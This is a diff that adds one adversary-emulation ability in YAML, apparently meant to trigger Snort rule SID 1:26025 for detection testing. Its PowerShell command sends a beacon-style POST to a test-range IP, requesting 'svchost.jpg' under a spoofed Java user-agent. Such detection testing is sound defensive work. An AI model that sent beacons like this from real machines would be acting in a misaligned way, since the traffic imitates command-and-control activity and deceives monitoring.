@@ -1,0 +1,35 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: IOC Java User-Agent'
+  technique_id: T1071.001
+  name: 'Intrusion: Java user-agent request to svchost.jpg'
+  description: 'Adversaries may exploit the behavior or vulnerability detected by
+    SID 1:26025 to evade detection and blend malicious communication with legitimate
+    web traffic. This activity aligns with T1071.001 (Application Layer Protocol:
+    Web Protocols), as attackers can use web protocols like HTTP/S for command and
+    control or data exfiltration while bypassing monitoring systems.'
+  executors:
+  - name: psh
+    platform: windows
+    command: 'Invoke-WebRequest -Uri "http://198.18.128.193/svchost.jpg" ` -Method
+      Post ` -Headers @{ "User-Agent" = "Java/1.7.0_80" } ` -Body "key=value" '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: d9eccb6a-46ea-466f-8ce8-69513b89f866
